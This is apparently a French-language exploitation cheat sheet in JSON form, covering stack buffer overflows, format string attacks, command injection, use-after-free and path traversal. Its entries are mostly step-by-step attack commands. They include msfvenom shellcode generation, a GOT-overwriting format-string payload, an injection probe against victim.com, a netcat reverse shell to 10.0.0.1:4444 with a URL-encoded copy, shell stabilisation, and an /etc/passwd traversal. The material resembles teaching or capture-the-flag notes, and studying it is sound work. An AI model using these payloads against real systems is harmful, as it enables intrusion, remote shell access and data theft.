{
  "Fonctions_vulnérables": {
    "strcpy": {
      "Nom_vulnérabilité": "Buffer Overflow (Stack)",
      "Explication": "Copie non contrôlée dans un buffer fixe, écrasant la pile.",
      "Exemple_code": "char buffer[64]; strcpy(buffer, user_input);",
      "Write-Up": {
        "Reconnaissance": {
          "Source": "Rechercher strcpy() avec entrée utilisateur",
          "Binaire": "Chercher call strcpy dans Ghidra/IDA (ex: `mov esi, user_input; call strcpy`)"
        },
        "Exploitation": {
          "Étape 1 - Fuzzing": {
            "Action": "Envoyer 100 'A' pour crash",
            "Commande": "./vuln_program $(python3 -c 'print(\"A\"*100)')"
          },
          "Étape 2 - Offset EIP": {
            "Action": "Générer pattern et trouver offset",
            "Commandes": [
              "msf-pattern_create -l 100 > pattern.txt",
              "gdb -q vuln_program\n> run $(cat pattern.txt)\n> info registers eip",
              "msf-pattern_offset -q [eip_value]"
            ]
          },
          "Étape 3 - Contrôle EIP": {
            "Action": "Valider avec BBBB",
            "Commande": "./vuln_program $(python3 -c 'print(\"A\"*76 + \"BBBB\")')"
          },
          "Étape 4 - Shellcode": {
            "Action": "Générer shellcode et construire payload",
            "Commandes": [
              "msfvenom -p linux/x86/exec CMD=\"/bin/sh\" -b \"\\x00\" -f python",
              "Construction payload : padding + EIP + NOPs + shellcode"
            ]
          }
        },
        "Post-Exploitation": {
          "Validation": "Exécuter id ou whoami",
          "Stabilisation": "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
        }
      }
    },

    "printf": {
      "Nom_vulnérabilité": "Format String Attack",
      "Explication": "Chaîne de format contrôlée permettant lecture/écriture mémoire.",
      "Exemple_code": "printf(user_input);",
      "Write-Up": {
        "Reconnaissance": {
          "Source": "printf() avec variable non formatée",
          "Binaire": "Appel à printf avec un seul argument sur la pile"
        },
        "Exploitation": {
          "Étape 1 - Fuite mémoire": {
            "Action": "Lire la pile avec %x",
            "Commande": "./vuln_program \"%08x.%08x.%08x\""
          },
          "Étape 2 - Écriture mémoire": {
            "Action": "Écraser la GOT avec %n",
            "Exemple": "./vuln_program \"$(python3 -c 'print(\"\\x24\\x97\\x04\\x08\" + \"%08x%n\")')\""
          },
          "Étape 3 - Redirection": {
            "Action": "Pointer vers shellcode",
            "Technique": "Remplacer exit@GOT par l'adresse du buffer"
          }
        }
      }
    },

    "system": {
      "Nom_vulnérabilité": "Command Injection",
      "Explication": "Exécution de commandes via entrée non filtrée.",
      "Exemple_code": "system(\"ping \" + user_input);",
      "Write-Up": {
        "Reconnaissance": {
          "Source": "Rechercher system()/popen() avec concaténation",
          "Binaire": "Chaînes comme /bin/sh dans .rodata"
        },
        "Exploitation": {
          "Étape 1 - Détection Injection": {
            "Action": "Tester ; ls ou $(ls)",
            "Commande": "curl 'http://victim.com/?input=;ls'"
          },
          "Étape 2 - Reverse Shell": {
            "Action": "Lancer netcat",
            "Commande": "nc -e /bin/sh 10.0.0.1 4444",
            "URL-Encode": "%3Bnc%20-e%20/bin/sh%2010.0.0.1%204444"
          }
        }
      }
    },

    "malloc": {
      "Nom_vulnérabilité": "Use-After-Free",
      "Explication": "Utilisation d'un pointeur après free().",
      "Exemple_code": "free(ptr); strcpy(ptr, \"data\");",
      "Write-Up": {
        "Reconnaissance": {
          "Source": "free() suivi d'accès mémoire",
          "Binaire": "Appels à malloc/free en séquence rapide"
        },
        "Exploitation": {
          "Étape 1 - Heap Feng Shui": {
            "Action": "Allouer/Free pour contrôler le tas",
            "Technique": "Allouer objet A → free → Allouer objet B"
          },
          "Étape 2 - Type Confusion": {
            "Action": "Écraser vtable ou fonction pointer",
            "Exemple": "Écraser la vtable d'un objet C++"
          }
        }
      }
    },

    "realpath": {
      "Nom_vulnérabilité": "Path Traversal",
      "Explication": "Canonicalisation de chemin non sécurisée.",
      "Exemple_code": "realpath(user_input, NULL);",
      "Write-Up": {
        "Reconnaissance": {
          "Source": "realpath() avec entrée utilisateur",
          "Binaire": "Appels à realpath avant open()"
        },
        "Exploitation": {
          "Étape 1 - Bypass chemin": {
            "Action": "Injecter ../../etc/passwd",
            "Commande": "./program ../../../etc/passwd"
          },
          "Étape 2 - Lire fichier": {
            "Action": "Exfiltrer contenu",
            "Résultat": "Accès au fichier sensible"
          }
        }
      }
    }
  },

  "Workflow_Type": {
    "Buffer_Overflow": [
      "1. Fuzzing initial",
      "2. Pattern create/offset",
      "3. Contrôle EIP/RIP",
      "4. Trouver badchars",
      "5. Générer shellcode",
      "6. Exploit final"
    ],
    "Format_String": [
      "1. Fuite mémoire (%x/%p)",
      "2. Écriture mémoire (%n)",
      "3. Overwrite GOT/DTORS",
      "4. Redirection vers shellcode"
    ],
    "Heap_Exploitation": [
      "1. Alloc/Free contrôlés",
      "2. Créer overlapping chunks",
      "3. Écraser metadata/fd/bk",
      "4. Arbitrary Write via unlink"
    ]
  },

  "Outils": {
    "Analyse_Statique": ["Ghidra", "IDA Pro", "Binary Ninja", "checksec"],
    "Fuzzing": ["AFL", "libFuzzer", "boofuzz"],
    "Exploitation": ["pwntools", "ROPgadget", "one_gadget", "gef"],
    "Post-Exploitation": ["linpeas", "mimikatz", "Metasploit"]
  }
}